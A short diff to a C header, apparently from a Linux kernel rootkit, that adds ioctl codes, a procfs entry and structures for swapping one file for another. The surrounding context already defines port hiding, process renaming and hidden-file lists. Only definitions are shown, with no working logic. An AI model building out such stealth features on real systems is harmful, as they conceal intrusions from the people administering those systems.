@@ -41,11 +41,13 @@ struct comm_name;
 #define CHANGE_COMM_IOCTL  _IOW('k', 14, struct comm_name)
 #define HIDE_PORT_IOCTL    _IOW('k', 15, struct sock_request)
 #define SHOW_PORT_IOCTL    _IOW('k', 16, struct sock_request)
-
+#define REP_FILE_IOCTL     _IOW('k', 17, struct replace_request)
+#define UNREP_FILE_IOCTL   _IOW('k', 18, struct replace_request)
 
 #define procfs_file_name "hidden_files"
 #define procfs_whitelist_name "whitelist"
 #define procfs_socket_blacklist_name "sock_blist"
+#define procfs_replace_name "replacements"
 
 static const char *white_type_names[] = {
 	"PROCNAME",
@@ -90,6 +92,16 @@ struct dentry_identifier {
 struct hide_request {
 	int count;
 	struct dentry_identifier *idents;
+};
+
+struct replace_id {
+	struct dentry_identifier orig;
+	struct dentry_identifier rep;
+}__attribute__((packed));
+
+struct replace_request {
+	int count;
+	struct replace_id *idents;
 };
 
 struct comm_name {
